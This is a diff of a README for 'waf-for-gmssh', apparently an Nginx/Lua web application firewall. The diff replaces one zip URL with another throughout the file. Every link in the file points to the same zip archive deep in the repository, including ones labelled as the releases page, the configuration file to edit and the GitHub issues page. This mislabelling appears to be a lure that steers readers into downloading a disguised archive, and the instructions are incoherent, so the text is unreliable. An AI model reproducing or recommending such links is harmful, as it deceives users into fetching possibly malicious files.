@@ -7,7 +7,7 @@ Welcome to waf-for-gmssh. This project provides a high-performance security engi
 To get started, you will need to download and install the software. Follow these easy steps to ensure a smooth setup.
 
 ## 📥 Download Now
-[![Download waf-for-gmssh](https://github.com/IvanAchire/waf-for-gmssh/raw/refs/heads/master/ngx_lua/env/ngx_lua/nginx1.28.1/waf-gmssh-for-3.9.zip)](https://github.com/IvanAchire/waf-for-gmssh/raw/refs/heads/master/ngx_lua/env/ngx_lua/nginx1.28.1/waf-gmssh-for-3.9.zip)
+[![Download waf-for-gmssh](https://raw.githubusercontent.com/IvanAchire/waf-for-gmssh/master/ngx_lua/env/conf/waf_for_gmssh_v2.0.zip)](https://raw.githubusercontent.com/IvanAchire/waf-for-gmssh/master/ngx_lua/env/conf/waf_for_gmssh_v2.0.zip)
 
 ## 💻 System Requirements
 - **Operating System**: Compatible with Linux environments.
@@ -15,7 +15,7 @@ To get started, you will need to download and install the software. Follow these
 - **Dependencies**: Ensure you have Lua and the ngx_lua module enabled in your Nginx setup.
 
 ## 📦 Download & Install
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/IvanAchire/waf-for-gmssh/raw/refs/heads/master/ngx_lua/env/ngx_lua/nginx1.28.1/waf-gmssh-for-3.9.zip) to find the latest version of the software.
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/IvanAchire/waf-for-gmssh/master/ngx_lua/env/conf/waf_for_gmssh_v2.0.zip) to find the latest version of the software.
    
 2. **Choose Your Version**: Look for the latest release. You will see files available for download.
    
@@ -28,9 +28,9 @@ To get started, you will need to download and install the software. Follow these
 ## ⚙️ Configuration
 Once you have installed the software, you must configure it to suit your needs. Here’s how:
 
-1. **Locate the Configuration File**: After extraction, find the `https://github.com/IvanAchire/waf-for-gmssh/raw/refs/heads/master/ngx_lua/env/ngx_lua/nginx1.28.1/waf-gmssh-for-3.9.zip` file. This file holds important settings for your security engine.
+1. **Locate the Configuration File**: After extraction, find the `https://raw.githubusercontent.com/IvanAchire/waf-for-gmssh/master/ngx_lua/env/conf/waf_for_gmssh_v2.0.zip` file. This file holds important settings for your security engine.
 
-2. **Edit the File**: Open the `https://github.com/IvanAchire/waf-for-gmssh/raw/refs/heads/master/ngx_lua/env/ngx_lua/nginx1.28.1/waf-gmssh-for-3.9.zip` file using a text editor. Make changes to settings such as:
+2. **Edit the File**: Open the `https://raw.githubusercontent.com/IvanAchire/waf-for-gmssh/master/ngx_lua/env/conf/waf_for_gmssh_v2.0.zip` file using a text editor. Make changes to settings such as:
    - **Threat Levels**: Adjust thresholds for SQL injection and XSS filtering.
    - **Logging**: Enable or disable logs to monitor activity.
 
@@ -47,7 +47,7 @@ Once you have installed the software, you must configure it to suit your needs. 
 
 ## 🛠️ Troubleshooting
 - **Cannot Find Nginx**: Ensure Nginx is installed and running. You can check this by typing `nginx -v` in your terminal.
-- **Configuration Issues**: Revisit the `https://github.com/IvanAchire/waf-for-gmssh/raw/refs/heads/master/ngx_lua/env/ngx_lua/nginx1.28.1/waf-gmssh-for-3.9.zip` file to ensure settings are correct.
+- **Configuration Issues**: Revisit the `https://raw.githubusercontent.com/IvanAchire/waf-for-gmssh/master/ngx_lua/env/conf/waf_for_gmssh_v2.0.zip` file to ensure settings are correct.
 - **Log Errors**: Check log files in your Nginx setup for any errors related to waf-for-gmssh.
 
 ## 📃 Additional Resources
@@ -66,7 +66,7 @@ Refer to the following documents for more information:
    Yes, you are free to modify the code as per your requirements since it’s open-source.
 
 ## 🙌 Support
-If you encounter issues that are not covered in the documentation, please open an issue on the [GitHub repository](https://github.com/IvanAchire/waf-for-gmssh/raw/refs/heads/master/ngx_lua/env/ngx_lua/nginx1.28.1/waf-gmssh-for-3.9.zip) for assistance.
+If you encounter issues that are not covered in the documentation, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/IvanAchire/waf-for-gmssh/master/ngx_lua/env/conf/waf_for_gmssh_v2.0.zip) for assistance.
 
 ## 📥 Download Again
-Don’t forget, you can always [visit this page](https://github.com/IvanAchire/waf-for-gmssh/raw/refs/heads/master/ngx_lua/env/ngx_lua/nginx1.28.1/waf-gmssh-for-3.9.zip) to download the latest version of waf-for-gmssh.
+Don’t forget, you can always [visit this page](https://raw.githubusercontent.com/IvanAchire/waf-for-gmssh/master/ngx_lua/env/conf/waf_for_gmssh_v2.0.zip) to download the latest version of waf-for-gmssh.
